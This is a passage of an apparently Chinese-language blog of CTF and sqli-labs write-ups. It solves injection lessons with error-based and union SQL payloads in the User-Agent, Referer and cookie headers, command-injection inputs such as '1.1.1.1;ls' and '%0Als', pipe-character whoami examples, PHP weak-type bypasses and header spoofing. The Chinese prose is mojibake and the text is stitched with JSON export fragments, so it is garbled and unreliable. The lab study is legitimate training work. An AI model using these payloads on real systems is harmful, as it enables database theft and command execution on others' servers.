æ­¤åªèƒ½å¦è¾Ÿè¹Šå¾„ è¿˜æœ‰ä¸€æ¡æ•°æ®åº“æ“ä½œè¯­å¥æ˜¯=INSERT= ï¼Œè¿™é‡Œç”¨åˆ°äº† $uagent, $IP ï¼Œå¯ä»¥é€šè¿‡Burpsuiteæˆ–è€…hackbaræ¥ä¿®æ”¹header\næˆ‘ä»¬è§‚å¯Ÿè¿™æ¡sqlè¯­å¥ï¼Œæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹çš„å†…å®¹æ˜¯$uagentçš„å€¼ï¼Œé‚£ä¹ˆå‰åçš„ä¸¤ä¸ª=\u0026rsquo;= å°±éœ€è¦é—­åˆï¼Œç„¶ååˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæ’å…¥sqlè¯­å¥ï¼Œç„¶åä½¿åŸsqlè¯­å¥æŠ¥é”™ï¼Œå¾—åˆ°éœ€è¦çš„ç»“æœ\nuser-agent=\u0026#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and \u0026#39;1\u0026#39;=\u0026#39;1lesson 19 å…ˆè¯»ä¸€ä¸‹æºç \n$uname = check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($con1, $_POST[\u0026#39;passwd\u0026#39;]); ...... echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 3 \u0026gt;\u0026#39;; $insert=\u0026#34;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;)\u0026#34;; mysqli_query($con1, $insert); ...... ä¸lesson-18çš„åŒºåˆ«å°±æ˜¯ï¼Œè¿™é‡Œçš„æ³¨å…¥ç‚¹åœ¨Referer,ä¿®æ”¹ä¸€ä¸‹å³å¯åˆ©ç”¨æŠ¥é”™æ³¨å…¥\nReferer=\u0026#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and \u0026#39;1\u0026#39;=\u0026#39;1 lesson 20 æ ¹æ®æç¤ºï¼Œè¿™é“é¢˜æ˜¯è¦åˆ©ç”¨cookieæ¥è¿›è¡Œæ³¨å…¥ï¼Œä¸€çœ‹æºä»£ç å‘ç°æ¯”å¹³æ—¶å¤šå‡ºäº†å¥½å¤šï¼Œæ­£å¥½æ¥ç»ƒä¹ ä¸€ä¸‹è¯»php\nç¬¬ä¸€æ¬¡ç™»é™† cookieä¸­æ²¡æœ‰ uname çš„å€¼ï¼Œè¿›å…¥å½“å‰if ç”¨ check_input è¿‡æ»¤ uname å’Œ passwd çš„å€¼ å¦‚æœæˆåŠŸæŸ¥è¯¢åï¼Œå°†æŸ¥è¯¢åˆ°çš„usernameå­˜åˆ° $cookee ä¸­ï¼ŒåŒæ—¶ setcookie æ¥è®¾ç½® cookie\nif(!isset($_COOKIE[\u0026#39;uname\u0026#39;])) { ...... if(isset($_POST[\u0026#39;uname\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;passwd\u0026#39;])) { $uname = check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($con1, $_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$unameand users.password=$passwdORDER BY users.id DESC LIMIT 0,1\u0026#34;; $result1 = mysqli_query($con1, $sql); $row1 = mysqli_fetch_array($result1, MYSQLI_BOTH); $cookee = $row1[\u0026#39;username\u0026#39;]; if($row1) { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 3 \u0026gt;\u0026#39;; setcookie(\u0026#39;uname\u0026#39;, $cookee, time()+3600); header (\u0026#39;Location: index.php\u0026#39;); echo \u0026#34;I LOVE YOU COOKIES\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size = 3 \u0026gt;\u0026#39;; // echo \u0026#39;Your Cookie is: \u0026#39; .$cookee;  echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/flag.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#34;Try again looser\u0026#34;;  print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } } echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;/font\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } POSTä¹‹åï¼Œresponseçš„headerä¸­å¯ä»¥çœ‹åˆ°è®¾ç½®çš„set-cookie\n å¦‚æœcookieæœ‰å€¼ï¼Œé‚£ä¹ˆè¿›å…¥å½“å‰ else,æ¥ç€ $cookee çš„å€¼è¿›è¡ŒæŸ¥è¯¢ï¼Œæ­¤å¤„å°±æ˜¯å¯ä»¥æ³¨å…¥çš„åœ°æ–¹\nelse { if(!isset($_POST[\u0026#39;submit\u0026#39;])) { $cookee = $_COOKIE[\u0026#39;uname\u0026#39;]; $format = \u0026#39;D d M Y - H:i:s\u0026#39;; $timestamp = time() + 3600; echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/Less-20.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;b\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;font color= \u0026#34;red\u0026#34; font size=\u0026#34;4\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;YOUR USER AGENT IS : \u0026#34;.$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;cyan\u0026#34; font size=\u0026#34;4\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;YOUR IP ADDRESS IS : \u0026#34;.$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 4 \u0026gt;\u0026#39;; echo \u0026#34;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE \u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;orange\u0026#34; font size = 5 \u0026gt;\u0026#39;; echo \u0026#34;YOUR COOKIE : uname = $cookeeand expires: \u0026#34; . date($format, $timestamp); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; $sql=\u0026#34;SELECT * FROM users WHERE username=\u0026#39;$cookee\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); if (!$result) { die(\u0026#39;Issue with your mysql: \u0026#39; . mysqli_error($con1)); } $row = mysqli_fetch_array($result, MYSQLI_BOTH); ä¿®æ”¹ cookie å³å¯åˆ©ç”¨æ³¨å…¥\n lesson 21 çœ‹æºç ï¼Œå’Œä¸Šä¸€é¢˜åŸºæœ¬ç±»ä¼¼ï¼Œåªä¸è¿‡è¿™é‡Œå¤šäº†ä¸€æ­¥base64åŠ å¯†ï¼ŒåŒæ—¶ä½¿ç”¨ ï¼ˆâ€˜â€™ï¼‰ è¿›è¡ŒåŒ…è£¹\n$cookee = base64_decode($cookee); echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; $sql=\u0026#34;SELECT * FROM users WHERE username=(\u0026#39;$cookee\u0026#39;) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); å› æ­¤æˆ‘ä»¬éœ€è¦è¦å…ˆå°†æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ç”¨base64åŠ å¯†ï¼Œå†æ³¨å…¥\n-1\u0026#39;)union select 1,2,database()-- -  lesson 22 è¯»æºç ï¼Œä¸lesson 21ç±»ä¼¼ï¼Œåªä¸è¿‡æ”¹äº†åŒ…è£¹çš„æ–¹æ³• \u0026quot;\u0026quot;\n$cookee = base64_decode($cookee); $cookee1 = \u0026#39;\u0026#34;\u0026#39;. $cookee. \u0026#39;\u0026#34;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; $sql=\u0026#34;SELECT * FROM users WHERE username=$cookee1LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); -1\u0026#34;union select 1,2,database()-- -  ","date":"2022-03-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sqli_labs_study/","title":"Sqli-labs Study: Basic Challenges"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt;\nexec1 å‘½ä»¤è¡Œæ‰§è¡Œ å…ˆè¯»æºç ï¼Œ\né¦–å…ˆï¼Œè„šæœ¬ç”¨str_replaceæ›¿æ¢äº†æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œç”±äºæ˜¯å•ç‹¬å­—ç¬¦çš„æ›¿æ¢ï¼Œæ²¡æœ‰åŠæ³•åˆ©ç”¨åŒå†™ç»•è¿‡ï¼Œæ¥ç€è€ƒè™‘ä¸‹é¢å‘½ä»¤è¡Œä¸­å¦‚æœæ‰§è¡Œé¢å¤–çš„å‘½ä»¤ é€šè¿‡%0Aæ¢è¡Œå®ç°æ–°çš„å‘½ä»¤æ‰§è¡Œ ?ip=1%0Als å¾—åˆ°\n è¿›è€Œè·å–æ–‡ä»¶å†…å®¹\n \u0026lt;?php // Get input  $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; // var_dump($target);  $target=trim($target); // var_dump($target);  // Set blacklist  $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;|\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist).  $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // var_dump($target);  // Determine OS and execute the ping command.  if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 1 \u0026#39; . $target ); } // Feedback for the end user  echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt;è™½ç„¶è¿™é‡Œä¸èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯è¿™é‡Œå¤ä¹ ä¸€ä¸‹Windowså’Œ*nixçš„ç®¡é“ç¬¦å·\nWindowsç³»ä¾‹æ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹æ‰€ç¤ºã€‚ â€œ|â€ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1|whoamiã€‚ â€œ||â€ï¼šå¦‚æœå‰é¢æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡ã€‚ä¾‹å¦‚ï¼šping 2||whoamiã€‚ â€œ\u0026amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1\u0026amp;whoamiã€‚ â€œ\u0026amp;\u0026amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼šping 127.0.0.1\u0026amp;\u0026amp;whoamiã€‚ Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹æ‰€ç¤ºã€‚ â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1;whoamiã€‚ â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚ä¾‹å¦‚ï¼šping 127.0.0.1|whoamiã€‚ â€œ||â€ï¼šå½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼šping 1||whoamiã€‚ â€œ\u0026amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1\u0026amp;whoamiã€‚ â€œ\u0026amp;\u0026amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼šping 127.0.0.1\u0026amp;\u0026amp;whoamiã€‚ hackergame2019-ç­¾åˆ°é¢˜  æ ¹æ®æç¤ºæŸ¥çœ‹å‰ä¸€å¹´çš„ç­¾åˆ°é¢˜çš„writeupï¼ŒçŒœæµ‹tokenåº”è¯¥æ˜¯hackergame2019ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•æäº¤tokenäº†\n TODOç½‘é¡µè¯»å–å™¨ ç®¡ç†å‘˜æœ¬åœ°è®¿é—®   æœ¬é¢˜è€ƒæŸ¥Burpä½¿ç”¨ä»¥åŠhttp headerçš„ç†è§£ï¼ŒåŠ ä¸Šclient-ip: 127.0.0.1å³å¯åœ¨â€œæœ¬åœ°â€è®¿é—®å¾—åˆ°flag\n ä¸‹è½½ä¸‹è½½ å…ˆå°è¯•ä¸‹è½½flag.txtæ–‡ä»¶æ˜¯ç©ºçš„\n æ ¹æ®æºä»£ç æç¤ºï¼ŒæŸ¥è¯¢flag.phpæ–‡ä»¶ ?file=flag.php\nå¾—åˆ°è§£å¯†æ–¹æ³•ï¼Œæ”¾åœ¨æœ¬åœ°æœåŠ¡å™¨è¿è¡Œåå¾—åˆ°flag\n\u0026lt;?php header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); //ç½‘é¡µç¼–ç  function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i \u0026lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i \u0026lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 ); } return base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i \u0026lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i \u0026lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) \u0026lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } return $str; } $key=\u0026#34;Pwnthebox\u0026#34;; $flag=\u0026#34;g9yk1pqdmqHa3qTJlqTFZbmShKmjaMHKzpJprg==\u0026#34;; echo decrypt($flag,$key) ?\u0026gt;å¿«é€Ÿè®¡ç®—  å°è¯•è®¡ç®—åè¾“å…¥ç»“æœï¼Œæ˜¯çœŸçš„éœ€è¦çŸ­æ—¶é—´å†…å¾—åˆ°ç»“æœï¼Œä½¿ç”¨pythonæ¥å®ç°ä¸€ä¸ªè„šæœ¬ï¼Œé¦–å…ˆGETè·å–å…¬ç¤ºï¼Œç»§è€Œè®¡ç®—åPOSTè¿”å›ï¼Œæœ€åå¾—åˆ°è¿”å›çš„flag\nimport requests, re url = \u0026#34;https://1239-e39bb701-ed06-4211-90bc-cabd6f666121.do-not-trust.hacking.run\u0026#34; s = requests.session() # get the GET result get_result= s.get(url) # use regular expression to find out the first result which end with pattern \u0026#34;\u0026lt;/p\u0026gt;\u0026#34; result = eval((re.findall(\u0026#34;\\S*(?=\u0026lt;/p\u0026gt;)\u0026#34;, get_result.text))[0]) post_result = s.post(url, data = {\u0026#34;result\u0026#34; : result}) print(post_result.text) è¯¥ç½‘ç«™å·²ç»è¢«é»‘ åœ¨ä¸»é¡µæ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯ é‚£ä¹ˆç›´æ¥ç”¨dirmapç›´æ¥æ‰«ç›®å½•\n PwnTheBox æŸ¥çœ‹æºä»£ç ï¼Œè·å¾—æç¤ºflagåœ¨headeré‡Œé¢\n æ”¾è¿›Burpé‡Œçœ‹ä¸€ä¸‹responseï¼Œè·å¾—Flag\n ç™¾åº¦ç½‘ç›˜åˆ†äº«é“¾æ¥ é¢˜ç›®æç¤ºç±»å‹ä¸ºå£ä»¤çˆ†ç ´ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯4ä½æ•°å­—ï¼ˆä¸ç„¶ä¹Ÿå¤ªå¤šäº†ï¼‰\n æ”¾åˆ°Burpé‡Œç”¨Intruderæ‰«æä¸€ä¸‹\nGet é˜…è¯»ç»™å‡ºçš„æºç ï¼Œåªè¦ç»™ä¸€ä¸ªGETå‚æ•°ï¼Œå¹¶ä¸”å€¼ä¸ºâ€œflagâ€å³å¯\n ?what=flag\n Post å’Œä¸Šä¸€é¢˜Getï¼Œç±»ä¼¼ï¼Œæˆ‘ä»¬ç”¨hackbarï¼Œcurlï¼Œburpï¼ŒpostmanåŠ ä¸Špostå‚æ•°çš„å€¼å°±å¯ä»¥äº†\n  ç¿æ™ºé¢˜ç›® åˆ©ç”¨burpçš„repeateråå¤è·å–ï¼Œå³å¯å¾—åˆ°flag\n ä¸€é“å¾ˆå¥‡æ€ªçš„é¢˜ç›® ä¸€è¿›å»alertå¼¹æ¡†ï¼Œæ²¡æœ‰åç«¯äº¤äº’ï¼Œä¹Ÿæ²¡æ³•æ˜¾ç¤ºæºç ï¼Œæ¨æµ‹flagåœ¨æœ¬åœ°ï¼ŒæŸ¥çœ‹æœ¬åœ°jsï¼Œå‘ç°jsçš„æœ€åæ˜¯html encodedçš„flag\n è§£ç ä¹‹åå¯å¾— https://codebeautify.org/html-decode-string\n å¥‡è‘©çš„é¢˜ç›® æ ¹æ®æç¤ºæŸ¥çœ‹æºç \n å‘ç°scriptæ‰§è¡Œå°†é€ƒé€¸åçš„urlç¼–ç è¿‡çš„ä»£ç ï¼Œä»¥æ­¤è§£ç p1, p2 ä»¥åŠ%35%34%61%61%32ï¼Œå¾—åˆ°scriptå†…å®¹ï¼š\n å¾—åˆ°æ»¡è¶³ç­‰å¼çš„å€¼ï¼Œç»§è€Œå¾—åˆ°flag\n éªŒè¯ç  ä¿®æ”¹è¾“å…¥æ¡†é•¿åº¦é™åˆ¶ï¼Œè®¡ç®—ç­”æ¡ˆæäº¤å¾—åˆ°flag\n TODOXSS è¾¾å•¦å´©å§å¤§å†’é™© è§‚å¯Ÿæºä»£ç çš„JSä»£ç ä¸­ï¼Œä¸æœåŠ¡å™¨äº¤äº’çš„ä»£ç å¦‚ä¸‹\n$(\u0026#34;#send\u0026#34;).click( function () { let v = $(\u0026#34;#input option:selected\u0026#34;).val(); addMsg(\u0026#34;æˆ‘\u0026#34;, opts[parseInt(v)]); ws.send(v) } ); å…¶ä¸­vå¾—èµ‹å€¼ç›´æ¥ä½¿ç”¨é€‰é¡¹ç¼–å·ï¼Œå­˜åœ¨æ³¨å…¥çš„å¯èƒ½ åœ¨â€œæ–™ç†å¤§å¸‚åœºâ€å¯ä»¥ä¹°é¸¡æå‡æ”»å‡»åŠ›ï¼Œè®¾ç½®v = -1900000000000000000ä¼šå‘ç”Ÿå¤§æ•´æ•°æº¢å‡ºï¼Œæ”»å‡»åŠ›æº¢å‡ºå‡ºåè°ƒæ•´é­”ç‹å¾—åˆ°flag\n  atchap ä¸ªäººè®¤ä¸ºè¿™é“é¢˜è€ƒæŸ¥å¯¹äºæœ€æ–°æ¼æ´çš„äº†è§£ä»¥åŠæ¢ç´¢ é˜…è¯»é¢˜ç›®åŒå¹´çš„è¿™ç¯‡æ–‡ç« Tchap: The super (not) secure app of the French governmentï¼Œå¯çŸ¥è¿™ä¸ªappæœ‰æ¼æ´ï¼Œåœ¨äºæ²¡æœ‰è¿‡æ»¤ç”¨æˆ·çš„æ•°æ®ã€‚åå°é€šè¿‡è¯†åˆ«åˆ—è¡¨ä¸­çš„é‚®ä»¶åç¼€åæ¥é€‰æ‹©æœåŠ¡å™¨ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡googleæ‰¾åˆ°ä¸€ä¸ªå·²ç»æ³¨å†Œçš„é‚®ç®±ï¼Œå°±å¯ä»¥åšåˆ°é€ƒé€¸ï¼Œå¹¶ä¸”åœ¨å‰é¢åŠ ä¸Šè‡ªå·±çš„é‚®ç®±å°±å¯ä»¥æ”¶åˆ°æ³¨å†Œé‚®ä»¶\né‚£ä¹ˆåœ¨è¿™é“é¢˜ä¸­ï¼Œfounderä¿¡æ¯ä»¥åŠåº•éƒ¨çš„è”ç³»äººä¿¡æ¯å‘Šè¯‰äº†æˆ‘ä»¬ç»•è¿‡çš„æ ¼å¼ï¼Œç„¶ååœ¨å‰é¢æ·»åŠ ä»»æ„çš„é‚®ä»¶åœ°å€å³å¯è¿”å›flag\n  phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ é˜…è¯»æºç ï¼Œéœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼Œå‚æ•°$a,$bçš„sha1åŠ å¯†åå¯†æ–‡ç›¸ç­‰ï¼Œkeyä¸ºjsonæ ¼å¼çš„å€¼ï¼Œå¹¶ä¸”è¯¥jsonæ•°æ®ä¸­çš„ä¸€ä¸ªé”®å«åšâ€œkeyâ€ï¼Œå€¼å’Œå‚æ•°$keyç›¸ç­‰\n\u0026lt;?php show_source(__FILE__); @include_once \u0026#39;flag.php\u0026#39;; //å‰ç«¯æ”»åŸç‹®è·‘è·¯äº†ï¼Œä¸è¿‡PHPæ˜¯æœ€å¥½çš„è¯­è¨€  $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; $good = false; if (sha1($a)===sha1($b)) { $good = true; } else die(\u0026#39;bypass\u0026#39;); if ($good \u0026amp;\u0026amp; isset($_GET[\u0026#39;key\u0026#39;])){ $message = json_decode($_GET[\u0026#39;key\u0026#39;]); if ($message-\u0026gt;key==$key) { echo $flag; } else die(\u0026#39;è¿˜å·®ä¸€ç‚¹å°±æ‹¿åˆ°flagäº†\u0026#39;); } ?\u0026gt;ç¬¬ä¸€ä¸ªæ¡ä»¶å¾ˆå®¹æ˜“æ»¡è¶³ï¼Œç›´æ¥è®©a=bå³å¯ ç¬¬äºŒä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬é¦–å…ˆè®©è¿™ä¸ªå€¼æ»¡è¶³jsonæ ¼å¼{key:value},å¹¶ä¸”è¿™ä¸ªvalueç­‰äº$key,åˆ©ç”¨phpçš„å¼±ç±»å‹è¯­è¨€çš„æ€§è´¨ï¼Œå½“æ•°å­—ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²ä¼šè½¬æ¢æˆæ•°å­—æ¥è¿›è¡Œæ¯”è¾ƒï¼ŒåŒæ—¶ç¬¬ä¸€ä½ä¸ä¸ºæ•°å­—æ—¶ï¼Œä¼šè½¬æ¢ä¸º0ï¼Œå› æ­¤æˆ‘ä»¬å°†valueè®¾ç½®ä¸º0ï¼Œçš†å¯å¾—åˆ°flag\n exec2 å…ˆè¯»PHPæºä»£ç \n\u0026lt;?php $ip = isset($_POST[\u0026#39;ip\u0026#39;])?$_POST[\u0026#39;ip\u0026#39;]:die(); if(!preg_match(\u0026#39;/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/i\u0026#39;,$ip)){ die(\u0026#34;ip æ ¼å¼é”™è¯¯!\u0026#34;); } echo strlen($ip); if(strlen($ip)\u0026lt;7||strlen($ip)\u0026gt;21){ die(\u0026#34;ip é•¿åº¦é”™è¯¯!\u0026#34;); } // Determine OS and execute the ping command. if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; .$ip ); }else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 1 \u0026#39; .$ip ); } // Feedback for the end user echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; æœ¬é¢˜åˆ©ç”¨preg_matchè¿›è¡Œè¿‡æ»¤ï¼Œè¦æ±‚è¾“å…¥çš„ å¼€å¤´ ä¸ºipv4åœ°å€çš„æ ¼å¼ï¼Œä½†æ˜¯æ²¡æœ‰ç®¡åé¢æ·»åŠ çš„å†…å®¹ï¼ŒåŒæ—¶è¦æ±‚é•¿åº¦çš„èŒƒå›´(7,21),å› æ­¤æˆ‘ä»¬å°†postçš„å€¼è®¾ä¸º 1.1.1.1;ls\n çœ‹åˆ°å¯¹åº”çš„txtæ–‡ä»¶ï¼Œè®¿é—®å³å¯è·å¾—flag\né»‘æ›œçŸ³æµè§ˆå™¨ é¢˜ç›®æœ¬èº«çš„æ„å›¾æ¯”è¾ƒå¥½çŒœï¼Œé€šè¿‡åœ¨httpçš„User-Agentå¤´ä¸ŠåŠ HEICOREæµè§ˆå™¨ï¼Œä½†æ˜¯æœ€æ–°ç‰ˆæœ¬æˆ‘ä¸€è‡´æ²¡æ‰¾åˆ°ï¼Œè¿˜æ˜¯çœ‹äº†å…¶ä»–çš„write-upæ‰æ‰¾åˆ°çš„\n ä¿¡æ¯å®‰å…¨ 2077 æ—¶é—´ç‚¹å‡»æŒ‰é’®ï¼Œæç¤º412 - Precondition Failedï¼Œæ¨æµ‹æ˜¯è¯·æ±‚çš„é—®é¢˜ï¼Œç”¨burpå‘é€è¯·æ±‚çœ‹responseï¼Œæ³¨æ„åˆ°Last modifiedçš„æ—¶é—´è¢«è®¾ç½®åˆ°äº†2077å¹´ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨=If-Unmodified-Since= ï¼š æŒ‡å®šçš„è¯·æ±‚èµ„æºåªæœ‰åœ¨å­—æ®µå€¼å†…å®šçš„æ—¥æœŸæ—¶é—´ä¹‹åï¼Œæœªå‘ç”Ÿæ›´æ–°çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½å¤„ç†è¯·æ±‚ï¼ŒåŒæ—¶å°†æ—¥æœŸè®¾åˆ°Last-Modifedä¹‹åï¼Œå³å¯ä¿è¯æ­£å¸¸å“åº”ï¼Œå¦åˆ™ä»¥çŠ¶æ€ç  412 Precondition Failed ä½œä¸ºå“åº”è¿”å›ã€‚ å‚è€ƒ\n æˆç»©æŸ¥è¯¢ ç¡®è®¤æœ‰sqlæ³¨å…¥ï¼ŒæˆåŠŸé—­åˆæœ‰å›æ˜¾+æ³¨å…¥è¯­å¥æ‰§è¡Œ\n çˆ†æ•°æ®åº“\n çˆ†è¡¨å\n çŸ›ç›¾ $num=$_GET[\u0026#39;num\u0026#39;]; if(!is_numeric($num)) { echo $num; if($num==1) echo \u0026#39;flag{**********}\u0026#39;; } è¯»æºç ï¼Œå¾ˆå®¹æ˜“å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¼±ç±»å‹æ¯”è¾ƒ ?num=1a 